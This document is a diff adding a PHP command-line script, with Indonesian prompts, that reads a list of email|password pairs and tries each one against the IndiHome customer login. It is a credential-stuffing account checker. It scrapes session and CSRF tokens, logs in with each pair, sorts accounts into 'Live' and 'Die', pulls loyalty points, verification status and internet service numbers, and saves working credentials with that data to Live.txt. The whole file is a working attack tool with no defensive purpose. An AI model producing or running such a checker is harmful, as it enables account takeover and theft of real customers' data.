@@ -1,0 +1,192 @@
+<?php
+error_reporting(E_ERROR | E_PARSE);
+$i=0;
+echo "Masukan File Akun (Email|Pass) : ";
+$fileakun = trim(fgets(STDIN));
+print PHP_EOL."Total Ada : ".count(explode("\n", str_replace("\r","",@file_get_contents($fileakun))))." Akun, Letsgo..\n";
+foreach(explode("\n", str_replace("\r", "", @file_get_contents($fileakun))) as $c => $akon){
+$pecah = explode("|", trim($akon));
+$i=$i+1;
+$email=trim($pecah[0]);
+$password=trim($pecah[1]);
+echo $i.". $email = ";
+$cookie=cookie();
+$login=login($cookie['xsrf'],$cookie['laravel'],$cookie['big'],$cookie['token'],$email,$password);
+if(strpos($login['response'], 'loginsuccess') !== false){
+echo"Live|Point: ".$login['point']."|";
+$profile=profile($login['xsrf'],$login['laravel'],$cookie['big']);
+echo "Account Verified: ".$profile['status']."|";
+$seamless=seamless($profile['xsrf'],$profile['laravel'],$cookie['big']);
+$getdata=getdata($seamless['xsrf'],$seamless['laravel'],$cookie['big'],$seamless['token'],$seamless['portfolio_id'],$seamless['no_inet'],$seamless['no_pots']);
+if (strpos($getdata, 'Seamless') !== false){
+	echo $seamless['no_inet'].": Terdaftar\n";
+	$simpan =fopen('Live.txt', 'a');
+	fwrite($simpan, $email."|".$password."|Point: ".$login['point']."|Account Verified: ".$profile['status']."|".$seamless['no_inet'].": Terdaftar\n");
+}
+else{
+	echo $seamless['no_inet'].": Tidak Terdaftar\n";
+	$simpan =fopen('Live.txt', 'a');
+	fwrite($simpan, $email."|".$password."|Point: ".$login['point']."|Account Verified: ".$profile['status']."|".$seamless['no_inet'].": Tidak Terdaftar\n");
+}}
+else{
+	echo "Die\n";
+}}
+function cookie(){
+$c = curl_init("https://www.indihome.co.id/verifikasi-layanan/cek-email");
+    curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($c, CURLOPT_CUSTOMREQUEST, 'GET');
+	curl_setopt($c, CURLOPT_ENCODING, 'gzip, deflate');
+	curl_setopt($c, CURLOPT_HEADER, 1);
+	curl_setopt($c, CURLINFO_HEADER_OUT, true);
+    $response = curl_exec($c);
+	$token=get_between($response,'name="_token" value="','">');
+	$xsrf=get_between($response,'XSRF-TOKEN=',';');
+	$laravel=get_between($response,'laravel_session_indihome=',';');
+	$big=get_between($response,'BIGipServerpool_indihome_https=',';');
+   return array(
+		'token' => $token,
+		'xsrf' => $xsrf,
+		'laravel' => $laravel,
+		'big' => $big
+    );
+}
+function login($xsrf,$laravel,$big,$token,$email,$password){
+$header = array();
+$header[] = "Host: www.indihome.co.id";
+$header[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0";
+$header[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
+$header[] = "Accept-Language: id,en-US;q=0.7,en;q=0.3";
+$header[] = "Accept-Encoding: gzip, deflate, br";
+$header[] = "Content-Type: application/x-www-form-urlencoded";
+$header[] = "DNT: 1";    
+$header[] = "Referer: https://www.indihome.co.id/verifikasi-layanan/login";    
+$header[] = "Connection: keep-alive";
+$header[] = "Upgrade-Insecure-Requests: 1";
+$header[] = 'Cookie: XSRF-TOKEN='.$xsrf.'; laravel_session_indihome='.$laravel.'; BIGipServerpool_indihome_https='.$big;
+$c = curl_init("https://www.indihome.co.id/verifikasi-layanan/login");
+    curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);;
+    curl_setopt($c, CURLOPT_POSTFIELDS, '_token='.$token.'&email='.$email.'&password='.$password);
+    curl_setopt($c, CURLOPT_POST, true);
+    curl_setopt($c, CURLOPT_ENCODING, "");
+    curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 0);
+    curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($c, CURLOPT_HEADER, true);
+    curl_setopt($c, CURLOPT_HTTPHEADER, $header);
+    $response = curl_exec($c);
+	$point=str_replace(' ','',preg_replace( "/\r|\n/", "", get_between($response,'https://www.indihome.co.id/poin">','</a>')));
+	$saring=get_between($response,'HTTP/1.1 200 OK','Content-Type');
+	$xsrf=get_between($saring,'XSRF-TOKEN=',';');
+	$laravel=get_between($saring,'laravel_session_indihome=',';');
+    return array(
+		'point' => $point,
+		'response' => $response,
+		'xsrf' => $xsrf,
+		'laravel' => $laravel
+    );
+}
+function profile($xsrf,$laravel,$big){
+$header = array();
+$header[] = "Host: www.indihome.co.id";
+$header[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0";
+$header[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
+$header[] = "Accept-Language: id,en-US;q=0.7,en;q=0.3";
+$header[] = "Accept-Encoding: gzip, deflate, br";
+$header[] = "Content-Type: application/x-www-form-urlencoded";
+$header[] = "DNT: 1";    
+$header[] = "Referer: Referer: https://www.indihome.co.id/";    
+$header[] = "Connection: keep-alive";
+$header[] = "Upgrade-Insecure-Requests: 1";
+$header[] = 'Cookie: XSRF-TOKEN='.$xsrf.'; laravel_session_indihome='.$laravel.'; BIGipServerpool_indihome_https='.$big;
+$c = curl_init();
+	curl_setopt($c, CURLOPT_URL, 'https://www.indihome.co.id/profile');
+    curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($c, CURLOPT_CUSTOMREQUEST, 'GET');
+	curl_setopt($c, CURLOPT_ENCODING, 'gzip, deflate');
+	curl_setopt($c, CURLOPT_HTTPHEADER, $header);
+	curl_setopt($c, CURLOPT_HEADER, 1);
+	curl_setopt($c, CURLINFO_HEADER_OUT, true);
+    $response = curl_exec($c);
+	$status=str_replace(' ','',get_between($response,'Profil IndiHome <b>','</b>'));
+	$xsrf=get_between($response,'XSRF-TOKEN=',';');
+	$laravel=get_between($response,'laravel_session_indihome=',';');
+	return array(
+		'status' => $status,
+		'response' => $response,
+		'xsrf' => $xsrf,
+		'laravel' => $laravel
+    );
+}
+function seamless($xsrf,$laravel,$big){
+$header = array();
+$header[] = "Host: www.indihome.co.id";
+$header[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0";
+$header[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
+$header[] = "Accept-Language: id,en-US;q=0.7,en;q=0.3";
+$header[] = "Accept-Encoding: gzip, deflate, br";
+$header[] = "Content-Type: application/x-www-form-urlencoded";
+$header[] = "DNT: 1";    
+$header[] = "Referer: Referer: https://www.indihome.co.id/";    
+$header[] = "Connection: keep-alive";
+$header[] = "Upgrade-Insecure-Requests: 1";
+$header[] = 'Cookie: XSRF-TOKEN='.$xsrf.'; laravel_session_indihome='.$laravel.'; BIGipServerpool_indihome_https='.$big;
+$c = curl_init();
+	curl_setopt($c, CURLOPT_URL, 'https://www.indihome.co.id/profile/status-langganan');
+    curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($c, CURLOPT_CUSTOMREQUEST, 'GET');
+	curl_setopt($c, CURLOPT_ENCODING, 'gzip, deflate');
+	curl_setopt($c, CURLOPT_HTTPHEADER, $header);
+	curl_setopt($c, CURLOPT_HEADER, 1);
+	curl_setopt($c, CURLINFO_HEADER_OUT, true);
+    $response = curl_exec($c);
+	$xsrf=get_between($response,'XSRF-TOKEN=',';');
+	$laravel=get_between($response,'laravel_session_indihome=',';');
+	$token=get_between($response,'_token: "','"');
+	$portfolio_id=get_between($response,'https://www.indihome.co.id/profile/hapus-layanan/','"');
+	$no_inet=get_between($response,'data-no_inet="','"');
+	$no_pots=get_between($response,'data-no_pots="','"');
+	return array(
+		'response' => $response,
+		'xsrf' => $xsrf,
+		'laravel' => $laravel,
+		'token' => $token,
+		'portfolio_id' => $portfolio_id,
+		'no_pots' => $no_pots,
+		'no_inet' => $no_inet
+    );
+}
+function getdata($xsrf,$laravel,$big,$token,$portfolio_id,$no_inet,$no_pots){
+$header = array();
+$header[] = "Host: www.indihome.co.id";
+$header[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0";
+$header[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
+$header[] = "Accept-Language: id,en-US;q=0.7,en;q=0.3";
+$header[] = "Accept-Encoding: gzip, deflate, br";
+$header[] = "Content-Type: application/x-www-form-urlencoded";
+$header[] = "DNT: 1";    
+$header[] = "Referer: https://www.indihome.co.id/profile/status-langganan";    
+$header[] = "Connection: keep-alive";
+$header[] = "Upgrade-Insecure-Requests: 1";
+$header[] = 'Cookie: XSRF-TOKEN='.$xsrf.'; laravel_session_indihome='.$laravel.'; BIGipServerpool_indihome_https='.$big;
+$c = curl_init("https://www.indihome.co.id/profile/status-langganan/get-data");
+    curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);;
+    curl_setopt($c, CURLOPT_POSTFIELDS, '_token='.$token.'&portfolio_id='.$portfolio_id.'&no_inet='.$no_inet.'&no_pots='.$no_pots);
+    curl_setopt($c, CURLOPT_POST, true);
+    curl_setopt($c, CURLOPT_ENCODING, "");
+    curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 0);
+    curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($c, CURLOPT_HEADER, true);
+    curl_setopt($c, CURLOPT_HTTPHEADER, $header);
+    $response = curl_exec($c);
+    return $response;
+}
+function get_between($string, $start, $end)
+    {
+        $string = " ".$string;
+        $ini = strpos($string,$start);
+        if ($ini == 0) return "";
+        $ini += strlen($start);
+        $len = strpos($string,$end,$ini) - $ini;
+        return substr($string,$ini,$len);
+    }
